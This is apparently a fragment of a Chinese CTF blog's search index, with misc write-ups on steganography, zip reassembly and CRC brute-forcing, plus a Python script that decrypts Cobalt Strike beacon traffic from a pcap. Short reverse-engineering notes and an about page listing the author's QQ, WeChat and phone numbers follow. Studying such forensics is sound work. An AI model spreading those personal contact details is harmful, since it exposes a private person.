class="line">2c243f2f3b3114345d0a0909333f06100143023b2c55020912</span><br></pre></td></tr></table></figure><p>可以发现文章里有雪隐写，里面隐写了xor的密码:</p><img src="2024-12-10 110816.png" alt="2024-12-10 110816" style="zoom:50%;"><p>接下来cyberchef就能出了</p><img src="2024-12-10 111131.png" alt="2024-12-10 111131" style="zoom:75%;"><h3 id="5-非黑即白"><a href="#5-非黑即白" class="headerlink" title="5.非黑即白"></a>5.非黑即白</h3><p>得到一个没有后缀的文件，010打开发现是逆序的gif</p><p>利用puzzlesolver逆序回来，得到gif，再拆分一下发现全是黑白图片：</p><img src="2024-12-10 113100.png" alt="2024-12-10 113100" style="zoom:50%;"><p>这里应该是二进制，脚本提取一下（脚本借鉴的。。）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">hash_lst = &#123;&#125;</span><br><span class="line">pixel_list = &#123;&#125;</span><br><span class="line">data_list = &quot;&quot;</span><br><span class="line">for i in range(1536):</span><br><span class="line">    filename = f&quot;&#123;i&#125;.png&quot;</span><br><span class="line">    tmp_img = Image.open(filename)</span><br><span class="line">    tmp_pixel = tmp_img.getpixel((0,0))[0]</span><br><span class="line">    # print(tmp_pixel)</span><br><span class="line">    if tmp_pixel &lt; 200:</span><br><span class="line">        data_list += &#x27;0&#x27;</span><br><span class="line">    else:</span><br><span class="line">        data_list += &#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">print(data_list) </span><br></pre></td></tr></table></figure><p>这个需要放在文件同目录下，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">010100000100101100000011000001000001010000000000000000010000000000000000000000001110101101011000010110010101100110011101110010111100011110011010001010100000000000000000000000000001111000000000000000000000000000001000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010011110111100011000101111101011100101100011111010111101011001110111011111100000011011000010010111010010100010101110011110000101000000001011101110000101101101111111111010011001000001111111101001010100111110011110011101001100011011000001110111001110001011101111111101100000110101011010110101110101100001001100000100010101011010111100001000001010000010010110000000100000010001111110000000000010100000000000000000100000000000000000000000011101011010110000101100101011001100111011100101111000111100110100010101000000000000000000000000000011110000000000000000000000000000010000000000000100100000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000011001100110110001100001011001110010111001110100011110000111010000001010000000000010000000000000000000000000000000000000000000000000000100000000000110000000000001011000011101010101010000000001100010110010011011011011000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001010000010010110000010100000110000000000000000000000000000000000000000100000000000000010000000001011010000000000000000000000000010100000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>放在cyberchef里可以看到是一个压缩包，下载下来</p><img src="2024-12-10 113656.png" alt="2024-12-10 113656" style="zoom:75%;"><p>gif的帧间隔里隐藏了密码</p><img src="2024-12-10 113936.png" alt="2024-12-10 113936" style="zoom: 50%;"><p>要删除最后一个0，使用 cyberchef 转 ascii 码得到：</p><img src="2024-12-10 114346.png" alt="2024-12-10 114346" style="zoom:50%;"><p>用密码解压zip得到flag：DASCTF{H3r3_1s_C0L0rful_W0rld}</p><h3 id="6-天命人"><a href="#6-天命人" class="headerlink" title="6.天命人"></a>6.天命人</h3><p>得到zip里面是6个文件，解压之后用010打开发现是一个zip打乱了顺序分成了6个</p><p>脚本使其重新成为一个zip：（这里需要我们手动重命名顺序）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data1 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data2 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data3 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data4 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;5&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data5 = f.read()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data6 = f.read()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data2))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data3))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data4))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data5))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data6))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">387797</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res.append(data1[i])</span><br><span class="line">        res.append(data2[i])</span><br><span class="line">        res.append(data3[i])</span><br><span class="line">        res.append(data4[i])</span><br><span class="line">        res.append(data5[i])</span><br><span class="line">        res.append(data6[i])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.zip&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="built_in">bytes</span>(res))</span><br></pre></td></tr></table></figure><p>得到一个zip，解压出来是两个有密码的zip文件</p><img src="2024-12-10 154544.png" alt="2024-12-10 154544" style="zoom:50%;"><p>可以发现根器里面的txt很小，只有4字节，利用crc爆破一下（注意要重命名，不能出现中文</p><img src="2024-12-10 154750.png" alt="2024-12-10 154750" style="zoom:75%;"><p>得到：<code>C0M3_4ND_Get_S1X_R00TS!!</code></p><p>解压未竟zip，发现金箍棒图片是要我们手提像素点，利用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-f&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入文件名称&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, required=<span class="literal">True</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-size&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&#x27;1x1&#x27;</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;-resize&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">1</span>, required=<span class="literal">False</span>,</span><br><span class="line">                    <span class="built_in">help</span>=<span class="string">&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;</span>)</span><br><span class="line">args  = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.p) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.n) <span class="keyword">and</span> re.search(<span class="string">r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;</span>, args.size):</span><br><span class="line">        x1, y1 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">0</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        x2, y2 = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.p.split(<span class="string">&quot;+&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width, height = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.n.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line">        width_size, height_size = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x), args.size.split(<span class="string">&quot;x&quot;</span>))</span><br><span class="line"></span><br><span class="line">        img_path = os.path.abspath(args.f)</span><br><span class="line">        file_name = img_path.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        img = cv2.imread(img_path, cv2.IMREAD_COLOR)</span><br><span class="line">        row, col = img.shape[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">        r, c = <span class="built_in">len</span>(<span class="built_in">range</span>(y1, y2 + <span class="number">1</span>, height)), <span class="built_in">len</span>(<span class="built_in">range</span>(x1, x2 + <span class="number">1</span>, width))</span><br><span class="line">        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, <span class="number">3</span>))</span><br><span class="line">        <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(r), <span class="built_in">range</span>(c)):</span><br><span class="line">            <span class="keyword">for</span> y_size <span class="keyword">in</span> <span class="built_in">range</span>(height_size):</span><br><span class="line">                <span class="keyword">for</span> x_size <span class="keyword">in</span> <span class="built_in">range</span>(width_size):</span><br><span class="line">                    <span class="comment"># new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]</span></span><br><span class="line">                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)</span><br><span class="line">                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)</span><br><span class="line">                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()</span><br><span class="line">                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># cv2.imshow(new_img)</span></span><br><span class="line">        cv2.imwrite(<span class="string">f&quot;_<span class="subst">&#123;file_name&#125;</span>&quot;</span>, new_img)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;已保存到运行目录中...&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;参数-p或参数-n或参数-size, 输入错误!&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python get_pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10</span><br></pre></td></tr></table></figure><p>得到：</p><img src="2024-12-10 155835.png" alt="2024-12-10 155835" style="zoom:75%;"><p>这个是veracrypt加密的磁盘文件，需要我们挂载</p><p>挂载需要密钥。密钥文件</p><img src="2024-12-12 162453.png" alt="2024-12-12 162453" style="zoom:50%;"><p>然后点加载,就能在z盘里看到flag</p><img src="2024-12-12 162657.png" alt="2024-12-12 162657" style="zoom:75%;"><h2 id="3-杂题"><a href="#3-杂题" class="headerlink" title="3.杂题"></a>3.杂题</h2><h3 id="2023-sictf-一起上号不"><a href="#2023-sictf-一起上号不" class="headerlink" title="2023 sictf 一起上号不"></a>2023 sictf 一起上号不</h3><p><u>从这道题浅看CS流量分析</u></p><p>拿到一个pcapng，先foremost一下得到一个zip，解压出来一个<code>key</code>文件</p><p>这个key肯定就是常用的<code>.cobaltstrike.beacon_keys</code>文件了，保存下来</p><p>之后我们还需要拿到两样东西：一个是元数据（cookie的加密数据），一个是<code>submit.php</code>里的data</p><p>过滤一下http很快就能发现cookie-元数据：</p><img src="屏幕截图 2025-02-05 232713.png" alt="屏幕截图 2025-02-05 232713" style="zoom:80%;"><p>元数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=</span><br></pre></td></tr></table></figure><p>接下来就是submit.php了：</p><img src="屏幕截图 2025-02-06 004446.png" alt="屏幕截图 2025-02-06 004446" style="zoom:80%;"><p>内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698</span><br></pre></td></tr></table></figure><p>这里的subphp有四个，对应四个心跳包，都有可能藏flag，需要一个个尝试</p><p>经尝试，第三个是藏flag的，即上面这个</p><p>执行脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;.cobaltstrike.beacon_keys&quot;</span></span><br><span class="line">encode_data = <span class="string">&quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;</span></span><br><span class="line">encrypt_data = <span class="string">&quot;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_key</span>(<span class="params">key_data</span>):</span><br><span class="line">    key_data = <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, key_data))</span><br><span class="line">    formatted_key = <span class="string">f&quot;-----BEGIN PRIVATE KEY-----\n&quot;</span></span><br><span class="line">    formatted_key += base64.encodebytes(key_data).decode()</span><br><span class="line">    formatted_key += <span class="string">f&quot;-----END PRIVATE KEY-----&quot;</span></span><br><span class="line">    <span class="keyword">return</span> formatted_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">    <span class="keyword">if</span> hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[:<span class="number">16</span>] != signature:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    pobj = javaobj.load(fd)</span><br><span class="line"></span><br><span class="line">PRIVATE_KEY = format_key(pobj.array.value.privateKey.encoded.data)</span><br><span class="line">private_key = RSA.import_key(PRIVATE_KEY.encode())</span><br><span class="line">cipher = PKCS1_v1_5.new(private_key)</span><br><span class="line">ciphertext = cipher.decrypt(base64.b64decode(encode_data), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ciphertext[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:</span><br><span class="line">    raw_aes_keys = ciphertext[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()</span><br><span class="line">    aes_key = raw_aes_hash256[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    hmac_key = raw_aes_hash256[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">SHARED_KEY = binascii.unhexlify(aes_key.<span class="built_in">hex</span>())</span><br><span class="line">HMAC_KEY = binascii.unhexlify(hmac_key.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">encrypt_data = base64.b64encode(<span class="built_in">bytes</span>.fromhex(encrypt_data)).decode()</span><br><span class="line">encrypt_data = base64.b64decode(encrypt_data)</span><br><span class="line">encrypt_data_length = <span class="built_in">int</span>.from_bytes(encrypt_data[:<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:]</span><br><span class="line">data1 = encrypt_data_l[:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature = encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line"></span><br><span class="line">dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;AES key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(aes_key.<span class="built_in">hex</span>()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HMAC key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hmac_key.<span class="built_in">hex</span>()))</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">12</span>:<span class="built_in">int</span>.from_bytes(dec[<span class="number">4</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)])</span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure><p>脚本项目地址： <a href="https://github.com/5ime/CS_Decrypt">5ime&#x2F;CS_Decrypt: CobaltStrike流量解密脚本</a></p><p>得到：</p><img src="屏幕截图 2025-02-06 004647.png" alt="屏幕截图 2025-02-06 004647" style="zoom:33%;"><p>flag：SICTF{88a39373-e204-43b6-b321-33ac8972fde9}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Reverse Record</title>
      <link href="/2024/11/Reverse-Record/"/>
      <url>/2024/11/Reverse-Record/</url>
      
        <content type="html"><![CDATA[<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><h3 id="pyc反编译"><a href="#pyc反编译" class="headerlink" title="pyc反编译"></a>pyc反编译</h3><blockquote><p><code>.pyc</code> 是 Python 编译后的字节码文件，通常是在运行 Python 脚本时由解释器自动生成，用于加速程序运行</p><p>想查看 <code>.pyc</code> 文件的源码，可以使用反编译工具 uncompyle6 将其还原为 <code>.py</code> 文件。</p></blockquote><p>-使用 uncompyle6</p><p>-在线网站 <a href="https://tool.lu/pyc/">https://tool.lu/pyc/</a></p><h3 id="exe反编译"><a href="#exe反编译" class="headerlink" title="exe反编译"></a>exe反编译</h3><p>使用IDA</p><h3 id="apk反编译"><a href="#apk反编译" class="headerlink" title="apk反编译"></a>apk反编译</h3><p>使用jadx-gui-1.4.4-no-jre-win.exe</p><h1 id="NewStar-re复现"><a href="#NewStar-re复现" class="headerlink" title="NewStar-re复现"></a><strong>NewStar-re复现</strong></h1><p><strong>学MISC果然还是要带点其他领域，那就学点RE吧！而RE的入门还是觉得NewStar好，不会了还有WP看（bushi</strong></p><h2 id="1-ez-debug"><a href="#1-ez-debug" class="headerlink" title="1.ez_debug"></a><em>1.ez_debug</em></h2><p>当初不会写是因为这个代码风格我有点看不懂，而且很长加上不怎么会调试所以没写出来。</p><p><img src="re2.png" alt="re2"></p><p>这里我们应该发现decrypted flag应该是输入的flag与加密之后再解密的flag比较<br>注意上面的you函数，步入后看到几个变量，下断点，调试</p><p><img src="re3.png" alt="re3"></p><p>能看得到v5的值在缓慢变化成flag，不断f8单步执行即得到flag</p><p>总结:看到提示后应该多步入函数看看，断点也可以下在函数里。F8单步执行可以缓慢查看变量的变化。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Before-everthing</title>
      <link href="/2024/11/Before-everthing/"/>
      <url>/2024/11/Before-everthing/</url>
      
        <content type="html"><![CDATA[<h1 id="这里是MetaVi的Blog"><a href="#这里是MetaVi的Blog" class="headerlink" title="这里是MetaVi的Blog"></a>这里是MetaVi的Blog</h1><h2 id="主要更新一些学习上的问题，简单的笔记和写题的记录…"><a href="#主要更新一些学习上的问题，简单的笔记和写题的记录…" class="headerlink" title="主要更新一些学习上的问题，简单的笔记和写题的记录…"></a><strong>主要更新一些学习上的问题，简单的笔记和写题的记录…</strong></h2><p>尽量使自己学有所得–</p><p>——————————</p><h2 id="作者VX"><a href="#作者VX" class="headerlink" title="作者VX:"></a><strong>作者VX:</strong></h2><h3 id="x3289444724"><a href="#x3289444724" class="headerlink" title="x3289444724"></a><strong>x3289444724</strong></h3><h2 id="作者QQ"><a href="#作者QQ" class="headerlink" title="作者QQ:"></a><strong>作者QQ:</strong></h2><h3 id="3289444724"><a href="#3289444724" class="headerlink" title="3289444724"></a><strong>3289444724</strong></h3><h2 id="联系电话"><a href="#联系电话" class="headerlink" title="联系电话:"></a><strong>联系电话:</strong></h2><h3 id="①13968975069"><a href="#①13968975069" class="headerlink" title="①13968975069"></a><strong>①13968975069</strong></h3><h3 id="②18072320271"><a href="#②18072320271" class="headerlink" title="②18072320271"></a><strong>②18072320271</strong></h3>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
